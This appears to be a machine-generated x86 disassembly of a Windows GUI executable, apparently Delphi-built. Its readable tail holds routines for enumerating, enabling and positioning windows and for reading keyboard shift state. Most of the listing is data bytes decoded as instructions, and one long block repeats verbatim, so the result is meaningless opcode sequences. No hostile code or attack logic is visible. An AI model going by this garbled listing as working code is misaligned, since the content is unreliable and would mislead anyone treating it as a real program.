add al [ eax ]
[ esi + eax + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
add [ eax ] al
inc [ esi + ebp + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
call 0x744d579
add eax 0x726f4654
insd
call 0x7844d583
pop [ eax + eax + 0x5e ]
add [ 0x6d726f46 ] al
jae r-xdata
call 0xffffffff99439352
push es
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
mov eax 0x4c004333
enter 0x44 0x74
lds eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
insb
inc esp
add [ ebp + eax * 8 + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sbb al 0xc8
insb
mov eax 0x6c0042fb
add [ eax ] eax
call [ eax + 0x10043a2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
jb r-xdata
outsd
inc eax
in eax dx
inc edx
add [ ecx ] ah
add bh bh
les ebp [ ebx + eax * 2 ]
add [ eax + 0x2d ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] al
popad
jb r-xdata
popad
outsb
sbb [ ecx + 0x700041 ] dh
add bh bh
adc [ ebx ] bh
inc ebx
add [ ebx + edi ] ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
add [ eax ] al
jb r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
aam 0x44
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
rcl cl 0x1
inc esp
add al cl
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
dec [ eax - 0x53ffbb4c ]
lds eax [ eax + eax ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax + 0x1 ] al
mov al 0xa2
inc ebx
add ah dl
mov [ 0x43 ] al
outsb
je r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jo r-xdata
je r-xdata
mov al [ eax + eax + 0x31 ]
add al [ eax ]
push [ ecx ]
add al [ eax ]
dec eax
aam 0x44
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ ebx + esi + 0x43 ] dh
add [ eax + ecx * 8 ] bl
inc ebx
add [ eax - 0x37ffbcc7 ] ah
aam 0x44
add [ eax ] al
add bh bh
pop esp
pop esi
inc ebx
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
dec esp
lea eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
pushfd
in al dx
inc edx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
jae r-xdata
add [ 0x6e617254 ] dl
mov cl 0x41
add ah ch
add al [ eax ]
inc [ esi + eax + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ds
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x4ff0001 ] ah
movsb [ edi ] [ esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
in al dx
inc edx
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x4f00ffff ] ah
mov [ 0xffffffffa2d40043 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ ecx ] al
add [ eax ] al
call 0x7444d694
add [ eax ] al
[ esi + ebx * 2 + 0x43 ]
sub_4497cb
inc esp
add [ edx + ebx * 2 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
[ ecx + esi ]
sub_4498a2
add [ eax ] eax
dec eax
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003e ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add al [ eax ]
call [ eax - 0x3700fffe ]
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
mov esp 0x9800448b
add al [ eax ]
[ eax - 0x3700fffe ]
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax + 0x4f090045 ] al
js r-xdata
add al [ eax ]
dec eax
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
push ecx
jne r-xdata
nop
jb r-xdata
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
dec eax
push eax
outsd
jo r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
outsb
inc ebx
jb r-xdata
enter 0x44d4 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ eax ] cl
dec edi
jb r-xdata
jbe r-xdata
jns r-xdata
dec edi
outsb
inc esp
jb r-xdata
xchg esp eax
int1
inc edx
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
mov al [ 0xffffffffc8ff0002 ]
jo r-xdata
pushad
push cs
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
pushad
inc eax
hlt
or [ edi + 0x6e ] ecx
jb r-xdata
add [ eax ] al
or [ eax ] 0xa
dec edi
push cs
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
outsb
inc esp
jae r-xdata
add [ ecx ] cl
dec edi
push cs
inc ecx
add al dl
add al [ eax ]
call eax
add bh bh
enter 0x44d4 0x0
imul esi [ ebp + 0x49 ] 0x606f666e
inc ecx
push cs
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
dec eax
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
outsb
outsw
pushad
jo r-xdata
outsb
inc edi
je r-xdata
add [ eax ] al
or [ eax + eax + 0xd ] 0x4f
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
inc edx
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
int1
inc edx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
jb r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
int1
inc edx
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax ] al
dec eax
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
outsb
inc esp
jb r-xdata
loopne r-xdata
jo r-xdata
out dx eax
int3
outsb
dec eax
imul esp [ ebp + 0x3c ] 0xa800448c
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
add bh bh
enter 0x44d4 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
push esp
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
add [ ecx ] cl
dec edi
outsb
dec ebx
jns r-xdata
out dx al
inc edx
add al dl
add [ eax ] al
call eax
add [ eax ] al
dec eax
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
dec ebp
add [ esi ] al
dec edi
outsd
jne r-xdata
push ebp
jo r-xdata
insb
pop eax
cmc
inc edx
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
outsb
inc esp
outsd
ja r-xdata
push cs
inc ecx
add al cl
add al [ eax ]
dec eax
add al [ eax ]
dec eax
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0xf2f8776f
inc edx
add [ eax ] al
add [ eax ] eax
push edi
push 0x556c6565
jo r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
hlt
jae r-xdata
push edi
inc edx
add al bl
add [ eax ] al
sbb al 0xef
inc esp
add [ ebx + esi ] dh
inc eax
add ah ah
loope r-xdata
jb r-xdata
outsb
push ebx
push 0x4374726f
jne r-xdata
push cs
inc ecx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
dec eax
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
je r-xdata
jpe r-xdata
add [ esp + eax * 2 + 0x2c000 ] cl
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
pop eax
cmc
inc edx
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0057 ] al
outsb
dec ebp
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax - 0x3a ] al
inc esp
add [ eax - 0x61 ] dl
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ edi + eax * 8 ] dh
inc esp
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
sub cl cl
inc esp
add ah dh
mov [ eax + eax + 0x4 ] 0xa000433a
leave
inc esp
add ah al
pop esp
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ eax + 0x43 ] al
add [ eax ] bh
mov ecx 0xd0440044
inc esp
add [ eax ] dl
jbe r-xdata
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
loopne r-xdata
add [ eax + 0x500043ac ] cl
retn
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x449e 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
movsb [ edi ] [ esi ]
out dx al
inc edx
add al ah
add [ eax ] al
jmp eax
jl r-xdata
outsd
arpl [ ebx - 0x74 ] bp
inc edx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
ror [ eax + 0x449d ] 0x0
add [ eax ] al
popad
inc esp
add [ eax - 0x3ffbaff ] cl
mov ebx 0xfc8c0044
inc esp
add [ ebx + 0x44 ] ch
add [ eax ] cl
fld [ eax + eax + 0x68 ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
sahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 4 + 0x44 ] bh
inc esp
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
add [ esi + ebx * 4 + 0x2f80044 ] dh
add [ eax ] al
cwde
mov [ eax + eax + 0x7c ] es
mov [ 0xffffffffbbc40041 ] al
inc esp
add [ eax - 0x43 ] bh
inc esp
add [ eax - 0x2 ] al
add [ esp + edi * 8 - 0x1c93ffbc ] cl
inc esp
add [ edi + ebx * 8 ] ah
inc esp
add [ eax - 0x53ffbc8a ] ch
jbe r-xdata
inc esp
add [ ecx + ecx * 8 ] ah
inc esp
add [ ecx ] cl
add [ eax + eax - 0x4fd3ff5f ] al
inc edx
add [ eax + 0xc0044e1 ] ah
jne r-xdata
mov al 0x39
mov al 0xb
mov al 0xc5
test [ eax ] al
mov eax [ 0x42b02c00 ]
add [ ecx - 0x176bffbd ] al
inc esp
add [ eax - 0x4d ] bl
inc ebx
add [ eax ] al
sahf
inc ebx
add [ eax + 0x2c0044fd ] ch
mov bl 0x44
add ah bl
mov ch 0x44
add [ eax - 0x3bffbb12 ] cl
mov esi 0xbf400044
sub_449afc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004e ] al
outsb
dec eax
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
inc edx
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
out dx eax
inc edx
add al bl
add [ eax ] eax
add bh bh
enter 0x44d4 0x0
imul esi [ ebp + 0x49 ] 0x606f666e
push cs
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
dec eax
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
outsb
dec eax
imul esp [ ebp + 0x3c ] 0xa800448c
add al [ eax ]
[ eax + 0x1ff0002 ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
loopne r-xdata
jo r-xdata
out dx eax
int3
add bh bh
enter 0x44d4 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
push esp
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
add [ ecx ] cl
dec edi
outsb
dec ebx
jns r-xdata
out dx al
inc edx
add al dl
add [ eax ] al
call eax
add [ eax ] al
dec eax
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
outsd
jne r-xdata
push ebp
jo r-xdata
insb
pop eax
cmc
inc edx
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
outsb
inc esp
outsd
ja r-xdata
push cs
inc ecx
add al cl
add al [ eax ]
dec eax
add al [ eax ]
dec eax
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0xf2f8776f
inc edx
add [ eax ] al
add [ eax ] eax
push edi
push 0x556c6565
jo r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
hlt
jae r-xdata
push edi
inc edx
add al bl
add [ eax ] al
sbb al 0xef
inc esp
add [ ebx + esi ] dh
inc eax
add ah ah
loope r-xdata
jb r-xdata
outsb
push ebx
push 0x4374726f
jne r-xdata
push cs
inc ecx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
dec eax
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
je r-xdata
jpe r-xdata
add [ esp + eax * 2 + 0x2c000 ] cl
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
pop eax
cmc
inc edx
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0057 ] al
outsb
dec ebp
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax - 0x3a ] al
inc esp
add [ eax - 0x61 ] dl
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ edi + eax * 8 ] dh
inc esp
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
sub cl cl
inc esp
add ah dh
mov [ eax + eax + 0x4 ] 0xa000433a
leave
inc esp
add ah al
pop esp
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ eax + 0x43 ] al
add [ eax ] bh
mov ecx 0xd0440044
inc esp
add [ eax ] dl
jbe r-xdata
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
loopne r-xdata
add [ eax + 0x500043ac ] cl
retn
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x449e 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
movsb [ edi ] [ esi ]
out dx al
inc edx
add al ah
add [ eax ] al
jmp eax
jl r-xdata
outsd
arpl [ ebx - 0x74 ] bp
inc edx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
ror [ eax + 0x449d ] 0x0
add [ eax ] al
popad
inc esp
add [ eax - 0x3ffbaff ] cl
mov ebx 0xfc8c0044
inc esp
add [ ebx + 0x44 ] ch
add [ eax ] cl
fld [ eax + eax + 0x68 ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
sahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 4 + 0x44 ] bh
inc esp
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
add [ esi + ebx * 4 + 0x2f80044 ] dh
add [ eax ] al
cwde
mov [ eax + eax + 0x7c ] es
mov [ 0xffffffffbbc40041 ] al
inc esp
add [ eax - 0x43 ] bh
inc esp
add [ eax - 0x2 ] al
add [ esp + edi * 8 - 0x1c93ffbc ] cl
inc esp
add [ edi + ebx * 8 ] ah
inc esp
add [ eax - 0x53ffbc8a ] ch
jbe r-xdata
inc esp
add [ ecx + ecx * 8 ] ah
inc esp
add [ ecx ] cl
add [ eax + eax - 0x4fd3ff5f ] al
inc edx
add [ eax + 0xc0044e1 ] ah
jne r-xdata
mov al 0x39
mov al 0xb
mov al 0xc5
test [ eax ] al
mov eax [ 0x42b02c00 ]
add [ ecx - 0x176bffbd ] al
inc esp
add [ eax - 0x4d ] bl
inc ebx
add [ eax ] al
sahf
inc ebx
add [ eax + 0x2c0044fd ] ch
mov bl 0x44
add ah bl
mov ch 0x44
add [ eax - 0x3bffbb12 ] cl
mov esi 0xbf400044
sub_44a13c
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_44a188
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_453890
mov eax [ rw-data ]
call sub_419dac
mov eax [ rw-data ]
call sub_419d54
retn
push 0x0
push eax
call ShowOwnedPopups
sub_44a1c0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_44a210
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_44a2b3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_44a27c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_44a1c0
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a2ba
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_44a2c4
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026ec
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_44a2fc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_44a360
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_44a2fc
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_44a3bc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_44a3dc
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_44a3bc
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_44a408
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_450e70
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_4512e0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407a5c
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_450e5c
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4512cc
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407a5c
test eax eax
je r-xdata
sub_44a490
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44a4e4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44a520
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_44a56c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44a5ca
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4480e0
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404094
mov eax [ ebp - 0x8 ]
pop edx
call sub_407a5c
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a5d1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
sub_44a5dc
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
